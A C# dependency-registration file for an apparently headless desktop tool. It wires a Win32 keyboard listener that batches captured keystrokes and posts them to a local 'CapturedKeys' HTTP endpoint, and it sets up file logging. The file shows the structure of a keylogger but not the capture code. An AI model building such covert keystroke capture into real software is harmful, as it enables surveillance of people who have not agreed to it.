using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using EMS.Core;
using EMS.Core.Interfaces;
using EMS.Core.Interfaces.Providers;
using EMS.Core.Providers;
using EMS.Infrastructure.Common.Configurations;
using EMS.Infrastructure.Common.Configurations.ListenersConfigs;
using EMS.Infrastructure.Common.Providers;
using EMS.Infrastructure.DependencyInjection;
using EMS.Infrastructure.DependencyInjection.Interfaces;
using Serilog;
using Serilog.Formatting;
using Serilog.Formatting.Json;

namespace EMS.Desktop.Headless
{
    public class DependenciesRegister
    {
        public IInjector RegisterDependencies(string jsonConfig)
        {
            var injector = UnityInjector.Instance;

            injector
                .Register<IWin32ApiProvider, Win32ApiProvider>()
                .RegisterInstance<KeyboardApiConfig>(new KeyboardApiConfig { SleepIntervalInMilliseconds = 15 })
                .Register<IKeyboardApi, KeyboardApi>(injector.Resolve<IWin32ApiProvider>(), injector.Resolve<KeyboardApiConfig>())
                .Register<IHttpClient, DefaultHttpClient>()
                .RegisterInstance<KeyboardListenerConfig>(new KeyboardListenerConfig
                {
                    SendCapturedItemsThreshold = 20,
                    SendCapturedItemsDestinationUri = "http://localhost:64435/api/CapturedKeys/PostCapturedKeys",
                    RetrySleepDurationsInMilliseconds = new List<int> { 1000, 2000, 3000 },
                    SendCapturedItemsTimerConfig = new TimerConfig
                    {
                        DueTime = 5000,
                        Period = 2000
                    }
                })
                .Register<IListener, KeyboardListener>(nameof(KeyboardListener), injector.Resolve<IHttpClient>(), injector.Resolve<IKeyboardApi>(), injector.Resolve<KeyboardListenerConfig>());

            this.RegisterSerilog();

            return injector;
        }

        private void RegisterSerilog()
        {
            var delimiter = Environment.NewLine;
            var formatter = new JsonFormatter(closingDelimiter: delimiter);
            var logsFilePath = @"..\..\Logs\Serilog.txt";

            Log.Logger = new LoggerConfiguration()
                .MinimumLevel.Debug()
                .WriteTo.File(formatter, logsFilePath)
                .CreateLogger();
        }
    }
}
